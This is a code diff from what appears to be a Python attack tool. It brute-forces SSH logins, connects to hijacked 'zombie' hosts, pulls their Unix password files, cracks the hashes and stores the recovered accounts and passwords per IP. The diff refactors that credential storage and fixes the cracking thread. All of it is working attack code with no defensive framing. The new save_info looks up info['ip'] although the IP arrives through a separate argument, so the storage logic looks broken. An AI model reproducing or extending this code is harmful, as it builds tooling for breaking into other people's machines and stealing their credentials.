@@ -10,7 +10,6 @@ import time
 from brute import bruteSSH, loginSSH, bruteUnixPasswd
 
 
-# 破解
 def brute(host, user, dictionary, *, connections):
     """调用并进行破解
 
@@ -48,13 +47,7 @@ def crack_chicken_unix_passwd(ip, passwd_file_info):
                 pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
                 pass_bruteinfo['account'][passwd_info['user']]['hash'] = line
 
-        # 需要加锁
-        if os.path.exists(gv.CHICKEN_PATH + gv.chicken_info_file):
-            chicken_info = json.load(open(gv.CHICKEN_PATH + gv.chicken_info_file, 'r'))
-        else:
-            chicken_info = {}
-        chicken_info[ip] = pass_bruteinfo
-        json.dump(chicken_info, open(gv.CHICKEN_PATH + gv.chicken_info_file, 'w'), indent=4)
+        save_info(mode='crack_unix_passwd', filename=gv.CHICKEN_PATH + gv.chicken_info_file, info=pass_bruteinfo, ip=ip)
 
 
 def get_unix_passwdfile(handle):
@@ -63,11 +56,10 @@ def get_unix_passwdfile(handle):
     return passwd_file_info
 
 
-# handle:pxssh handle host:ip
 def standard_operate_chicken(handle, host):
     """肉鸡标准操作
 
-    :param handle:登录句柄
+    :param handle:登录句柄 pxssh
     :param host:目标主机ip地址
     :return:
     """
@@ -77,12 +69,11 @@ def standard_operate_chicken(handle, host):
     # 破解unix密码
     passwd_file_info = get_unix_passwdfile(handle)
     t = threading.Thread(target=crack_chicken_unix_passwd, args=(host, passwd_file_info))
-
     loginSSH.close_connection(handle)
+    t.start()
     t.join()
 
 
-# brute_info:{'host': '1.2.3.4', 'user': 'root', 'type': 'password', 'key': None}
 def operate_chicken(brute_info):
     """登录肉鸡，并操作
 
@@ -94,19 +85,32 @@ def operate_chicken(brute_info):
         standard_operate_chicken(handle, brute_info['ip'])
 
 
-# 写入文件
-def write_file(filename, passwd_info):
-    """存储破解信息
+def save_info(mode, filename, info, **kw):
+    """存储信息
 
-    :param filename:
-    :param passwd_info:
+    :param mode:模式
+    :param filename:存储文件名
+    :param info:存储信息
+    :param kw:附加信息
     :return:
     """
-    with open(filename, 'a') as f:
-        f.write(str(passwd_info) + '\n')
+    if mode == 'scan_log':
+        with open(filename, 'a') as logfile:
+            json.dump(info, logfile)
+            logfile.write('\n')
+    elif mode == 'crack_unix_passwd':
+        # 需要加锁
+        if os.path.exists(filename):
+            chicken_info = json.load(open(filename, 'r'))
+        else:
+            chicken_info = {}
+        if 'ip' in kw:
+            chicken_info[info['ip']] = info
+        json.dump(chicken_info, open(filename, 'w'), indent=4)
+    else:
+        return None
 
 
-# 读取破解结果
 def read_files(filename, path=gv.CHICKEN_PATH):
     """读取原破解结果
 
